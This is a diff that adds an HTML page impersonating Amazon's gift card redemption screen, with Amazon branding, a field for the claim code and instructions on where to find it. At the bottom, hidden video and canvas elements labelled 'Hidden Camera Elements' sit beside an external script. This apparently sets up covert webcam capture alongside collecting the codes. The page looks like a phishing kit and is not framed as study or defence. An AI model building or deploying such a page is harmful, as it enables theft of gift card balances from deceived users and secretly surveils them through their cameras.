@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon - Redeem Gift Card</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Amazon Header -->
+    <header class="amazon-header">
+        <div class="header-content">
+            <div class="amazon-logo">
+                <i class="fab fa-amazon"></i>
+                <span>amazon</span>
+            </div>
+            <div class="header-nav">
+                <span>Account & Lists</span>
+                <span>Returns & Orders</span>
+                <span>Cart</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="main-container">
+        <div class="gift-card-container">
+            <!-- Gift Card Header -->
+            <div class="header-section">
+                <h1><i class="fas fa-gift"></i> Redeem a Gift Card</h1>
+                <p class="subtitle">Enter your claim code to add the gift card balance to your account</p>
+            </div>
+
+            <!-- Gift Card Form Section -->
+            <div class="form-section">
+                <div class="gift-card-visual">
+                    <div class="gift-card">
+                        <div class="gift-card-header">
+                            <i class="fab fa-amazon"></i>
+                            <span>Gift Card</span>
+                        </div>
+                        <div class="gift-card-amount">$XX.XX</div>
+                        <div class="gift-card-code">XXXX-XXXXXX-XXXX</div>
+                    </div>
+                </div>
+
+                <div class="input-section">
+                    <label for="giftCardCode">Enter your claim code:</label>
+                    <input type="text" id="giftCardCode" placeholder="Enter claim code" maxlength="30">
+                    <button class="apply-btn">Apply to your balance</button>
+                    <p class="help-text">
+                        <i class="fas fa-info-circle"></i> 
+                        Need help? <a href="#">Learn where to find your code</a>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Instructions Section -->
+            <div class="instructions-section">
+                <h3>Where to find your claim code</h3>
+                <div class="instruction-grid">
+                    <div class="instruction-item">
+                        <i class="fas fa-credit-card"></i>
+                        <h4>Physical Gift Cards</h4>
+                        <p>Your claim code is on the back of your card; you may need to scratch off the protective coating.</p>
+                    </div>
+                    <div class="instruction-item">
+                        <i class="fas fa-envelope"></i>
+                        <h4>Digital Gift Cards</h4>
+                        <p>Your claim code is in your email confirmation or on the gift card image.</p>
+                    </div>
+                    <div class="instruction-item">
+                        <i class="fas fa-print"></i>
+                        <h4>Print-at-Home</h4>
+                        <p>Your claim code is on the printed gift card, typically on the back or bottom.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Balance Section -->
+            <div class="balance-section">
+                <div class="balance-info">
+                    <h3>Your Gift Card Balance</h3>
+                    <div class="current-balance">$0.00</div>
+                    <a href="#" class="view-history">View gift card activity</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="amazon-footer">
+        <div class="footer-content">
+            <p>&copy; 2025, Amazon.com, Inc. or its affiliates</p>
+            <div class="footer-links">
+                <a href="#">Conditions of Use</a>
+                <a href="#">Privacy Notice</a>
+                <a href="#">Help</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Hidden Camera Elements -->
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script src="script.js"></script>
+</body>
+</html>
